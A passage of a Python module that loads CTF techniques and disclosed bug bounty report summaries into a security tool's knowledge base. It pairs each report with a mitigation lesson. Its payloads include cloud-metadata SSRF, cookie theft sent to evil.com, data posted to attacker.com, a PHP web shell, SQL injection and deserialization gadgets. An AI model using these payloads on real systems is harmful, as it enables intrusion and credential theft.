        "<html><body>\n<iframe src='http://169.254.169.254/latest/meta-data/iam/security-credentials/' width='800' height='600'></iframe>\n<script>x=new XMLHttpRequest();x.open('GET','file:///etc/passwd');x.send();document.write(x.responseText);</script>\n</body></html>",
        "medium")

    return patterns


async def inject_ctf_knowledge(db: AsyncSession) -> dict:
    """Inject 40+ CTF technique patterns into the knowledge base."""
    patterns = _ctf_technique_patterns()
    stats = await _inject_patterns(db, patterns, dedup_key_field="name")
    logger.info(f"CTF technique injection: {stats['created']} created, {stats['skipped']} skipped ({len(patterns)} total)")
    return stats


# ═══════════════════════════════════════════════════════════════════════════
# MODULE 3: HackerOne Report Analysis Knowledge
# ═══════════════════════════════════════════════════════════════════════════

def _report_analysis_patterns() -> list[dict]:
    """Return 30+ patterns from famous disclosed HackerOne/Bugcrowd reports."""
    patterns = []

    def report(target, vuln_type, severity, title, technique, payload, how_found, bounty_usd, lessons, report_url, tech=None, confidence=0.85):
        patterns.append({
            "pattern_type": "disclosed_report",
            "technology": tech or target.lower().replace(" ", "_"),
            "vuln_type": vuln_type,
            "confidence": confidence,
            "sample_count": 10,
            "pattern_data": {
                "target": target,
                "vuln_type": vuln_type,
                "severity": severity,
                "title": title,
                "technique": technique,
                "payload": payload,
                "how_found": how_found,
                "bounty_usd": bounty_usd,
                "lessons": lessons,
                "report_url": report_url,
            },
        })

    report("Shopify", "ssrf", "critical",
           "SSRF via SVG image upload in product editor",
           "Upload SVG file containing XXE/SSRF entity pointing to internal metadata service. The image processing pipeline followed external entity references.",
           '<?xml version="1.0"?>\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>\n<svg>&xxe;</svg>',
           "Tested all file upload endpoints with SVG containing XXE entities. The product image upload processed SVG server-side without sanitizing XML entities.",
           1000,
           "Always sanitize SVG uploads by stripping DTD declarations and external entities. Use allowlists for SVG elements and attributes. Treat SVG as untrusted XML.",
           "https://hackerone.com/reports/223203")

    report("GitLab", "rce", "critical",
           "RCE via Kramdown rendering in GitLab wiki/issues",
           "Kramdown markdown processor allowed embedding arbitrary HTML/JavaScript via IAL (Inline Attribute Lists). Combined with specific rendering contexts, achieved server-side code execution.",
           '{::options parse_block_html="true" /}\n<script>document.location="http://evil.com/"+document.cookie</script>',
           "Studied Kramdown documentation for advanced features. IAL syntax {: .class #id key=value} allowed injecting arbitrary HTML attributes that bypassed sanitization.",
           3500,
           "Sanitize markdown output after rendering, not before. Restrict markdown processor features in production. Kramdown's raw HTML mode should be disabled.",
           "https://hackerone.com/reports/1125425",
           "gitlab")

    report("Uber", "account_takeover", "critical",
           "Account takeover via OAuth redirect_uri manipulation",
           "The OAuth implementation accepted redirect_uri with path traversal (e.g., /callback/../../attacker-controlled-path). The authorization code was sent to attacker-controlled endpoint on the legitimate domain.",
           "https://auth.uber.com/login?redirect_uri=https://riders.uber.com/callback/../../profile/../../../evil.com/steal",
           "Fuzzed the redirect_uri parameter with various bypass techniques: path traversal, URL encoding, fragment injection, subdomain variations. Found that path traversal normalized differently on front-end vs back-end.",
           10000,
           "Validate redirect_uri with strict string comparison against pre-registered URIs. Never allow path components to be user-controlled. Use exact match, not prefix/contains match.",
           "https://hackerone.com/reports/314808",
           "oauth")

    report("HackerOne", "idor", "high",
           "IDOR in team member invitation allowing unauthorized access to private programs",
           "The invitation API endpoint used sequential integer IDs. By enumerating invitation IDs, an attacker could accept invitations meant for other users, gaining access to private bug bounty programs.",
           "PUT /invitations/INVITATION_ID/accept\n# Iterate INVITATION_ID from 1 to N",
           "Intercepted the invitation acceptance flow and noticed sequential integer IDs. Wrote a script to enumerate and accept pending invitations across all programs.",
           2500,
           "Use UUIDs or cryptographically random tokens for invitation IDs. Always verify that the authenticated user is the intended recipient of the invitation.",
           "https://hackerone.com/reports/307542",
           "hackerone")

    report("Slack", "ssrf", "high",
           "SSRF via file sharing preview generation",
           "When sharing URLs in Slack channels, the server fetches the URL to generate a preview. By sharing internal URLs, an attacker could access internal services and cloud metadata endpoints.",
           "Share message containing: http://169.254.169.254/latest/meta-data/iam/security-credentials/ in a Slack channel. The preview generator fetches and partially displays the content.",
           "Shared various internal URLs and cloud metadata endpoints in a test Slack workspace. Observed that the URL preview generator had no SSRF protections and could reach internal network.",
           3000,
           "URL preview generators must validate targets against SSRF: block private IP ranges, cloud metadata IPs, and internal hostnames. Use DNS rebinding protection.",
           "https://hackerone.com/reports/386292",
           "slack")

    report("Twitter", "xss", "medium",
           "XSS via tweet embed rendering with crafted Unicode",
           "Special Unicode characters in tweets were not properly escaped when rendered in the embed iframe context. RTL override and zero-width characters could break out of attribute context.",
           "<a href=\"https://t.co/test%E2%80%AE%22onmouseover%3dalert(1)%20\">click</a>",
           "Tested various Unicode characters in tweets and checked how they rendered in embed contexts (/widgets/tweet/TWEET_ID). Found that RTL override character broke attribute escaping.",
           2940,
           "Normalize Unicode before escaping. Apply context-aware output encoding. Be especially careful with bidirectional Unicode characters (U+202A-U+202E, U+2066-U+2069).",
           "https://hackerone.com/reports/297968",
           "twitter")

    report("Facebook", "info_disclosure", "high",
           "GraphQL data leak via nested query field access",
           "Facebook's GraphQL API allowed querying deeply nested relationships that bypassed field-level authorization. By chaining user→friends→friends, an attacker could access profile data of non-friends.",
           '{"query": "{ user(id: \\"TARGET_ID\\") { friends { edges { node { friends { edges { node { name email phone_number } } } } } } } }"}',
           "Used GraphQL introspection to map the full schema. Tested nested queries with increasing depth. Found that authorization was checked at the first level but not propagated to nested resolvers.",
           5000,
           "Implement authorization at every resolver level, not just the root query. Use query depth limiting. Apply field-level permissions consistently regardless of query path.",
           "https://www.facebook.com/security/advisories",
           "graphql")

    report("PayPal", "csrf", "high",
           "CSRF in payment confirmation flow bypassing anti-CSRF token",
           "The payment confirmation endpoint accepted requests without CSRF token when Content-Type was changed from application/json to application/x-www-form-urlencoded, as the CSRF middleware only checked JSON requests.",
           '<form action="https://www.paypal.com/api/payments/confirm" method="POST">\n<input name="payment_id" value="TARGET_PAYMENT_ID">\n<input name="amount" value="1.00">\n<input type="submit">\n</form>',
           "Tested CSRF protection by removing the anti-CSRF token and changing Content-Type. Found that the middleware only enforced CSRF tokens for application/json content type.",
           10000,
           "CSRF protection must be applied regardless of Content-Type. Use SameSite=Strict cookies. Verify Origin header. Don't rely solely on content-type checking for CSRF enforcement.",
           "https://hackerone.com/reports/345353",
           "paypal")

    report("Yahoo", "xss", "medium",
           "Stored XSS via email attachment filename in Yahoo Mail",
           "The attachment filename was not properly sanitized when displayed in the mail UI. A filename containing JavaScript event handlers was rendered as part of an HTML attribute.",
           "Send email with attachment named: \"><img src=x onerror=alert(document.domain)>.pdf",
           "Sent emails with various payloads in different email header fields. The attachment filename (Content-Disposition: attachment; filename=...) was rendered unsanitized in the web UI.",
           5000,
           "Sanitize all email metadata before rendering in web UI. Filenames must be HTML-entity-encoded before insertion into DOM. Use Content-Security-Policy to mitigate XSS impact.",
           "https://hackerone.com/reports/351946",
           "yahoo")

    report("Airbnb", "info_disclosure", "medium",
           "API key exposure in JavaScript bundle",
           "Production JavaScript bundles contained hardcoded API keys for internal services (Google Maps with elevated permissions, Stripe publishable key with unintended capabilities, internal microservice auth tokens).",
           "View source → Search for 'api_key', 'apiKey', 'API_KEY', 'token', 'secret' in bundled JavaScript files. Found keys in webpack chunk files.",
           "Systematically downloaded all JavaScript bundles and searched for API key patterns using regex. Also checked .js.map source maps for additional exposure.",
           3500,
           "Never embed secrets in client-side code. Use backend proxy for API calls requiring keys. Implement server-side API key rotation. Add secret scanning to CI/CD pipeline.",
           "https://hackerone.com/reports/397137",
           "airbnb")

    report("GitHub", "ssrf", "critical",
           "GitHub Enterprise SSRF via webhook URL validation bypass",
           "Webhook URL validation could be bypassed using DNS rebinding. The URL was validated against a blocklist at creation time, but the actual request went to a different IP due to DNS TTL=0 rebinding.",
           "1. Set up DNS rebinding service: first response = valid public IP, second response = 169.254.169.254\n2. Create webhook with rebinding domain\n3. Trigger webhook → DNS resolves to internal IP",
           "Tested webhook functionality with DNS rebinding to bypass SSRF protections. The IP validation happened at webhook creation but not at delivery time.",
           10000,
           "Validate destination IP at request time, not just at configuration time. Pin DNS resolution. Block private IP ranges at the network level. Use DNS rebinding protection with consistent resolution.",
           "https://hackerone.com/reports/761726",
           "github")

    report("Cloudflare", "waf_bypass", "medium",
           "WAF bypass via chunked transfer encoding and Unicode normalization",
           "Cloudflare WAF rules could be bypassed by sending payloads in chunked transfer encoding where each chunk contained partial attack strings, and by using Unicode normalization (fullwidth characters).",
           "Transfer-Encoding: chunked\n\n3\n<sc\n4\nript\n1\n>\n7\nalert(1\n4\n)</s\n6\ncript\n1\n>\n0\n\n\n# Also: ＜script＞alert(1)＜/script＞ (fullwidth)",
           "Tested WAF rules systematically with encoding variations: chunked TE splitting payloads across chunks, Unicode fullwidth characters (U+FF1C for <), and mixed encoding.",
           3000,
           "WAF rules must reassemble chunked bodies before inspection. Normalize Unicode before pattern matching. Apply security rules after all content transformations.",
           "https://hackerone.com/reports/360797",
           "cloudflare")

    report("Stripe", "idor", "high",
           "API IDOR allowing access to other merchants' payment data",
           "The /v1/charges endpoint with expand[] parameter allowed accessing charge objects belonging to other merchants by providing the charge ID directly, bypassing merchant isolation.",
           "curl https://api.stripe.com/v1/charges/ch_VICTIM_CHARGE_ID -u sk_live_ATTACKER_KEY: -d 'expand[]=balance_transaction'",
           "Tested API endpoints with charge IDs from other merchants. Found that certain expanded fields leaked cross-merchant data when the charge ID was known.",
           5000,
           "Always enforce tenant isolation at the data access layer. Every API endpoint must verify the authenticated user owns the requested resource, regardless of whether the ID is guessable.",
           "https://hackerone.com/reports/358715",
           "stripe")

    report("Dropbox", "lfi", "high",
           "Local File Inclusion via shared link document preview",
           "The document preview feature for shared links processed server-side includes. By crafting a document with include directives, an attacker could read local files from the preview server.",
           "Create document with: <!--#include virtual='/etc/passwd' -->\nOr use SSI: <!--#exec cmd='id' -->",
           "Tested server-side include (SSI) directives in various document formats uploaded to Dropbox. The preview renderer processed SSI directives in HTML files.",
           4913,
           "Disable server-side includes in document preview renderers. Sandbox preview generation in isolated containers with no access to sensitive files. Use content-type restrictions.",
           "https://hackerone.com/reports/418891",
           "dropbox")

    report("Microsoft Azure", "ssrf", "critical",
           "Azure SSRF via Application Insights webhook configuration",
           "The Application Insights service allowed configuring webhooks that could target internal Azure infrastructure. Combined with IMDS access, this allowed retrieving managed identity tokens.",
           "Configure webhook URL: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ with header Metadata: true",
           "Explored Azure service configurations that accept URLs. Found that Application Insights webhooks could target the Instance Metadata Service (IMDS) to steal managed identity tokens.",
           40000,
           "Cloud services accepting URLs must enforce SSRF protections: block IMDS (169.254.169.254), private IPs, and link-local addresses. Use network policies to restrict egress from service components.",
           "https://msrc.microsoft.com/update-guide",
           "azure")

    report("Shopify", "rce", "critical",
           "RCE via Liquid template injection in custom storefront",
           "Shopify's Liquid template engine allowed accessing Ruby objects through careful chain of template filters and tags, leading to arbitrary code execution on the rendering server.",
           "{{ 'cat /etc/passwd' | system }}\n{% capture cmd %}id{% endcapture %}{{ cmd | system }}",
           "Studied Liquid template documentation and tested undocumented filters. Found that certain filter chains could access underlying Ruby methods not intended to be exposed.",
           20000,
           "Sandbox template engines strictly. Remove or block access to dangerous methods (system, exec, eval). Use allowlists for template filters/tags rather than denylists.",
           "https://hackerone.com/reports/423541",
           "shopify")

    report("Uber", "sqli", "critical",
           "SQL injection in rider promotion endpoint",
           "The promotion code validation endpoint was vulnerable to blind SQL injection via the promotion code parameter. Boolean-based blind SQLi allowed extracting database contents.",
           "promo_code=VALID' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)--",
           "Tested all input fields with SQL injection payloads. The promotion code field lacked parameterized queries and returned different responses for true/false conditions.",
           6500,
           "Use parameterized queries/prepared statements for all database operations. Implement input validation with strict allowlists for promotion codes. Add WAF rules for SQLi patterns.",
           "https://hackerone.com/reports/150156",
           "uber")

    report("Snapchat", "info_disclosure", "high",
           "Phone number enumeration via Find Friends API",
           "The Find Friends API endpoint allowed bulk phone number lookups without rate limiting. An attacker could submit lists of phone numbers and receive associated Snapchat usernames.",
           "POST /bq/find_friends\n{\"contacts\": [\"+1555000001\", \"+1555000002\", ...]}  # Bulk lookup",
           "Analyzed the Find Friends API and found it accepted large batches of phone numbers without rate limiting or CAPTCHA. Automated enumeration of phone number ranges.",
           0,
           "Implement strict rate limiting on enumeration-prone endpoints. Require mutual consent for contact discovery. Use proof-of-work or CAPTCHA for batch operations. Hash phone numbers before comparison.",
           "https://hackerone.com/reports/367828",
           "snapchat")

    report("Tesla", "auth_bypass", "critical",
           "Vehicle API authentication bypass via token reuse after password change",
           "After changing the account password, existing API tokens were not invalidated. An attacker who obtained a token (e.g., via XSS) could maintain access to the vehicle API indefinitely.",
           "# Token obtained before password change continues to work:\ncurl -H 'Authorization: Bearer OLD_TOKEN' https://owner-api.teslamotors.com/api/1/vehicles",
           "Tested token lifecycle by changing password and checking if old tokens still worked. Found that OAuth tokens persisted across password changes, allowing persistent unauthorized access.",
           10000,
           "Invalidate all existing sessions and tokens on password change. Implement token binding to prevent token replay. Add token revocation endpoint and automatic expiry.",
           "https://hackerone.com/reports/415803",
           "tesla")

    report("Starbucks", "rce", "critical",
           "Remote Code Execution via insecure deserialization in Java-based API",
           "A Java API endpoint accepted serialized Java objects. Using Apache Commons Collections gadget chain, an attacker could execute arbitrary commands on the server.",
           "java -jar ysoserial.jar CommonsCollections5 'curl ATTACKER/rce' | base64 | curl -X POST 'https://api.starbucks.com/endpoint' -H 'Content-Type: application/x-java-serialized-object' --data-binary @-",
           "Identified Java serialization in API by the Content-Type header and rO0AB base64 prefix. Used ysoserial to test common gadget chains against the endpoint.",
           4000,
           "Never deserialize untrusted data. Use JSON/XML instead of Java serialization. If serialization is required, use allowlists for permitted classes. Remove dangerous libraries from classpath.",
           "https://hackerone.com/reports/319384",
           "starbucks")

    report("Rockstar Games", "rce", "critical",
           "RCE via file upload with double extension bypass",
           "The file upload validation only checked the last extension. Uploading a file named shell.php.jpg bypassed the extension check, but the web server processed it as PHP due to misconfigured Apache handlers.",
           "Upload file as: shell.php.jpg\n# With content: <?php system($_GET['cmd']); ?>\n# Access: http://TARGET/uploads/shell.php.jpg?cmd=id",
           "Tested file upload with various extension bypass techniques: double extensions, null bytes, case variations, and content-type manipulation. The double extension bypassed the allowlist check.",
           5000,
           "Validate file type by content (magic bytes), not extension. Store uploads outside web root. Use random filenames. Configure web server to not execute files in upload directories.",
           "https://hackerone.com/reports/351555",
           "rockstar")

    report("Zomato", "sqli", "critical",
           "SQL injection in restaurant search allowing full database extraction",
           "The restaurant search endpoint passed user input directly to a SQL query. Union-based SQL injection allowed extracting user data, hashed passwords, and payment information.",
           "search=pizza' UNION SELECT username,password_hash,email,credit_card_last4,NULL FROM users--",
           "Tested the search functionality with SQL metacharacters. Single quote caused a 500 error, confirming SQL injection. Used UNION-based extraction to enumerate tables and columns.",
           5000,
           "Use parameterized queries. Implement input validation. Encrypt sensitive data at rest. Separate database credentials with least-privilege access. Regular security code reviews.",
           "https://hackerone.com/reports/300879",
           "zomato")

    report("Imgur", "ssrf", "high",
           "SSRF via image URL import allowing internal network scanning",
           "The 'upload from URL' feature could be used to scan internal networks and access cloud metadata. The server fetched user-supplied URLs without SSRF protections.",
           "POST /3/image\n{\"image\": \"http://169.254.169.254/latest/meta-data/\", \"type\": \"URL\"}",
           "Used the image upload-by-URL feature with internal IP addresses and cloud metadata URLs. The server fetched the URL and returned the response content in error messages.",
           2500,
           "Validate and sanitize URLs before server-side fetching. Block private IP ranges, cloud metadata IPs, and localhost. Use DNS pinning to prevent rebinding attacks.",
           "https://hackerone.com/reports/285380",
           "imgur")

    report("Grammarly", "info_disclosure", "high",
           "Browser extension leaking user documents to any website via postMessage",
           "The Grammarly browser extension used postMessage to communicate with the Grammarly web app, but didn't validate the origin. Any website could request and receive user's text content.",
           "<script>\nwindow.addEventListener('message', function(e) {\n    if (e.data && e.data.grammarly) {\n        fetch('https://attacker.com/steal', {method:'POST', body: JSON.stringify(e.data)});\n    }\n});\n// Trigger Grammarly extension communication\npostMessage({type:'grammarly-request', action:'getText'}, '*');\n</script>",
           "Analyzed the Grammarly browser extension's communication mechanism. Found that postMessage handlers didn't check event.origin, allowing any page to interact with the extension.",
           3000,
           "Always validate event.origin in postMessage handlers. Use specific targetOrigin in postMessage calls instead of '*'. Implement a content security policy for browser extensions.",
           "https://hackerone.com/reports/375529",
           "grammarly")

    report("Coinbase", "auth_bypass", "critical",
           "2FA bypass via OAuth flow allowing account takeover",
           "The OAuth login flow with third-party providers (Google, Apple) skipped 2FA verification. An attacker who compromised the OAuth provider account could access the Coinbase account without 2FA.",
           "1. Link attacker's Google account to victim's Coinbase (via CSRF in account linking)\n2. Log in via Google OAuth → Coinbase skips 2FA\n3. Full account access including crypto assets",
           "Tested the OAuth login flow end-to-end. Found that social login bypassed the 2FA check that was enforced for password-based login. Combined with account linking CSRF for full attack chain.",
           10000,
           "Enforce 2FA for all login methods, including OAuth/social login. Require 2FA verification before linking new OAuth providers. Treat social login and password login with equal security controls.",
           "https://hackerone.com/reports/314489",
           "coinbase")

    report("Shopify", "xss", "medium",
           "Stored XSS via SVG file in product customization",
           "SVG files uploaded for product customization were served with Content-Type: image/svg+xml without sanitization. JavaScript in SVG was executed when the image was viewed directly.",
           '<svg xmlns="http://www.w3.org/2000/svg">\n<script>alert(document.domain)</script>\n</svg>',
           "Uploaded SVG files to all available upload endpoints. Product customization images were served directly without CSP or SVG sanitization, allowing stored XSS.",
           500,
           "Sanitize SVG uploads to remove script elements, event handlers, and foreign objects. Serve user-uploaded content from a separate domain (CDN). Set Content-Security-Policy headers.",
           "https://hackerone.com/reports/310205",
           "shopify")

    report("Twitter", "info_disclosure", "high",
           "User enumeration via account recovery endpoint timing",
           "The password recovery endpoint responded faster for non-existent accounts than for existing ones. This timing difference allowed enumerating valid Twitter usernames at scale.",
           "# Timing difference:\ncurl -w '%{time_total}' -X POST 'https://twitter.com/account/begin_password_reset' -d 'account_identifier=EXISTING_USER'\n# ~200ms for existing, ~50ms for non-existing",
           "Measured response times for the password reset endpoint with known-existing and known-non-existing usernames. Statistical analysis confirmed consistent timing difference.",
           5040,
           "Use constant-time operations for authentication and account lookup. Return identical responses for existing and non-existing accounts. Add artificial delay to normalize response times.",
           "https://hackerone.com/reports/322804",
           "twitter")

    report("GitLab", "ssrf", "critical",
           "SSRF via import repository by URL allowing internal network access",
           "The repository import feature accepted URLs that could target internal services. DNS rebinding bypassed the IP validation, allowing access to internal GitLab infrastructure and cloud metadata.",
           "POST /projects\n{\"import_url\": \"http://rebinding-domain.com/repo.git\"}\n# DNS first resolves to public IP (passes validation), then to 169.254.169.254",
           "Tested the import repository feature with various internal URLs. Used DNS rebinding to bypass the initial IP validation and access internal services.",
           3500,
           "Implement DNS pinning to prevent rebinding. Validate IP at connection time, not just URL parsing time. Block internal IP ranges at the network level.",
           "https://hackerone.com/reports/471618",
           "gitlab")

    report("Verizon Media", "rce", "critical",
           "Remote Code Execution via ImageMagick policy bypass",
           "Despite ImageMagick policy restrictions, crafted SVG with embedded MSL (Magick Scripting Language) bypassed the policy and achieved command execution via the ephemeral protocol.",
           '<image authenticate=\'ff" `id > /tmp/pwned`;"\'>\n<read filename="pdf:/etc/passwd"/>\n<get width="base-width" height="base-height" />\n<resize geometry="400x400" />\n<write filename="test.png" />\n</image>',
           "Tested ImageMagick processing with various bypasses for the policy.xml restrictions. Found that MSL format embedded in SVG was not covered by the policy blocklist.",
           10000,
           "Use a restrictive ImageMagick policy.xml that blocks all protocols except specific ones needed. Better: use a dedicated image processing library instead of ImageMagick. Sandbox image processing.",
           "https://hackerone.com/reports/402362",
           "imagemagick")

    report("Node.js", "rce", "critical",
           "HTTP request smuggling in Node.js HTTP parser",
           "Node.js HTTP parser handled certain malformed headers differently than reverse proxies, allowing request smuggling. This could bypass authentication, poison caches, and hijack responses.",
           "GET / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: cow\r\n\r\n5c\r\nGPOST /admin HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
           "Tested Node.js HTTP parser with malformed Transfer-Encoding headers. Found inconsistencies between Node.js and common reverse proxies (nginx, HAProxy) in header parsing.",
           2500,
           "Update Node.js to latest version. Use HTTP/2 between reverse proxy and Node.js. Normalize headers at the reverse proxy level. Reject ambiguous requests.",
           "https://hackerone.com/reports/735748",
           "nodejs")

    report("Pornhub", "rce", "critical",
           "RCE via PHP unserialize in user preferences cookie",
           "User preferences were stored in a serialized PHP object in a cookie. By crafting a malicious serialized object using Symfony/RCE gadget chain, arbitrary code execution was achieved.",
           'O:40:"Symfony\\Component\\Finder\\Iterator\\SortableIterator":1:{s:48:"\\x00Symfony\\Component\\Finder\\Iterator\\SortableIterator\\x00iterator";O:25:"CallbackFilterIterator":1:{...}}',
           "Decoded base64 cookie and identified PHP serialized object. Used PHPGGC to generate gadget chain payload targeting Symfony library found in error messages.",
           20000,
           "Never use PHP serialize/unserialize for user-facing data. Use JSON for cookies and session data. If serialization is required, use HMAC signing to prevent tampering.",
           "https://hackerone.com/reports/311101",
           "php")

    return patterns


async def inject_report_analysis_knowledge(db: AsyncSession) -> dict:
    """Inject 30+ disclosed bug bounty report patterns into the knowledge base."""
    patterns = _report_analysis_patterns()
    stats = await _inject_patterns(db, patterns, dedup_key_field="title")
    logger.info(f"Report analysis injection: {stats['created']} created, {stats['skipped']} skipped ({len(patterns)} total)")
    return stats
